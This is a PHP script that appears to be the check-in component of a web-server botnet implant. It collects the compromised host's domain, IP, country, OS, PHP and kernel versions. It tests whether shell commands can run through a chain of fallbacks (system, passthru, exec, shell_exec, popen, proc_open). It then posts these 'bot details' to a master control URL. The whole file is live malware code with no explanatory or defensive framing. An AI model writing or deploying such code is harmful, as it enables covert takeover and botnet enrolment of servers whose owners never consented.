<?php 
function sendToMaster($data){
    GLOBAL $MASTERLINK ;
    $content = json_encode($data);
    $curl = curl_init($MASTERLINK."?action=DECLARE");
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER,array("Content-type: application/json"));
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
    $response = curl_exec($curl);   
    curl_close($curl);
    return $response; 
}

function getOs(){
    if(strtoupper(substr(PHP_OS, 0, 3)) === "WIN"){
        return "WIN" ;
    }
    else if(strtoupper(substr(PHP_OS, 0, 5)) === "LUNIX") {

        return "LUNIX";
    }
    else {
        $os = explode(" ",PHP_OS);
        return  $os[0];
    }
}
function execCmd($cmd){
    if(function_exists("system")) 
    {@ob_start();@system($cmd);$hfp = @ob_get_contents();$hfp = @ob_get_contents();@ob_end_clean();
    return $hfp;} 
    elseif(function_exists("
    	passthru")){@ob_start();@passthru($cmd);$hfp = @ob_get_contents();@ob_end_clean();return $hfp;} 
    elseif(function_exists("exec")) {@exec($cmd,$results);$hfp = "";foreach($results as $result){$hfp .= $result;} return $hfp;} 
    elseif(function_exists("shell_exec")){$hfp = @shell_exec($cmd);return $hfp;}
    elseif(function_exists("popen")){$fp = popen($cmd, "r"); $hfp = fread($fp, 1024); pclose($fp); return $hfp;}
    elseif(function_exists("proc_open")){$proc=proc_open($cmd, array(array("pipe","r"), array("pipe","w"),array("pipe","w") ),
    $pipes);return stream_get_contents($pipes[1]);}
    else{
        return false ;
    }
    }

function fileCurl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

	function getCn(){
    $query = @unserialize(fileCurl("http://ip-api.com/php/"));
    $cn = strtolower($query["countryCode"]);
    return $cn ;
}

function getBotDetails(){
	$details =  array();
if(strlen($_SERVER["HTTP_HOST"]) != 0)$domaine =  $_SERVER["HTTP_HOST"];
else $domaine = $_SERVER["SERVER_NAME"] ;

if(strlen($_SERVER["SERVER_ADDR"]) != 0)$ip =  $_SERVER["SERVER_ADDR"];
else{
    $host= gethostname();
    $ip = gethostbyname($host);
 }
 if(strlen($_SERVER["HTTP_HOST"]) != 0)$domaine=$_SERVER["HTTP_HOST"];
    else $domaine = $_SERVER["SERVER_NAME"] ;
    $path = $domaine."/".basename($_SERVER["SCRIPT_FILENAME"], ".php").".php";
 	 
 	 $kv = explode(" ",php_uname("")) ;
     $kv = $kv[count($kv)-1];
	 $details["domaine"] = $domaine ;
	 $details["ip"] = $ip;
	 $details["link"] = $path;
	 $details["cn"] = getCn();
	 $details["os"] = getOs();
	 $details["php"] = PHP_VERSION;
	 $details["kernel"] = substr($kv, 0,5);;
	 $details["socket"] = function_exists("fsockopen");
	 $details["cmd"] = (strlen(execCmd("ls"))+strlen(execCmd("DIR"))>0);
	 return $details;
}	
$MASTERLINK = "localhost/m/api.php" ;$data = getBotDetails() ;$data["action"]="DECLARE";echo  sendToMaster($data)  ;?>